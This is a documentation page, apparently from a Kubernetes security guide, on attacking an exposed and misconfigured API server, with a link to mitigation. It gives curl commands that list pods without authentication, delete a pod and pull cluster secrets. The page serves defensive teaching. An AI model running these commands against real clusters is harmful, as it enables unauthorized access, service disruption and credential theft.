---
sidebar_position: 2
title: "Compromised API Server"
description: "Exploiting Kubernetes API server vulnerabilities and how attackers gain unauthorized access."
---

# Compromised API Server

A compromised Kubernetes API server allows attackers to interact directly with the cluster’s control plane. If authentication or authorization is misconfigured—or worse, disabled entirely—an attacker may gain full control over workloads, resources, and data.

This article demonstrates how attackers identify exposed API servers and exploit them to disrupt services or escalate privileges.

---

## Exploitation Steps: Exposed API Endpoints

### 1. Scan for an Exposed API Server

An attacker performs a port scan to discover the Kubernetes API server:

```bash
nmap -p 6443 <cluster-ip>
```

Port 6443 is the default Kubernetes API server port. If reachable from outside the cluster, it may be vulnerable.

### 2. Access the API Server Without Authentication

The attacker sends an unauthenticated request to list pods:

```bash
curl -k https://<api-server-ip>:6443/api/v1/pods
```

If authentication is misconfigured or disabled, the server may return a list of all pods in the cluster.

### 3. Delete Cluster Resources

The attacker attempts to delete a critical pod:

```bash
curl -k -X DELETE https://<api-server-ip>:6443/api/v1/namespaces/default/pods/victim-pod
```

Without proper access controls, the request may succeed, resulting in service downtime or disruption.

### 4. Escalate Privileges

After gaining API access, the attacker attempts to retrieve service account tokens or secrets:

```bash
curl -k https://<api-server-ip>:6443/api/v1/secrets
```

They may exploit these credentials to impersonate other services or users, bypass RBAC policies, and further compromise the cluster.

---

### Result

An attacker with access to a misconfigured API server can:

- View, modify, or delete workloads and configurations.
- Exfiltrate secrets and service account tokens.
- Deploy malicious containers or alter existing ones.
- Escalate privileges and compromise other components.
- Fully control or destroy the Kubernetes cluster.

---

## Mitigation

➡ [Securing the Kubernetes API Server](/docs/best_practices/cluster_setup_and_hardening/api_server_security/compromised_api_server_mitigation)
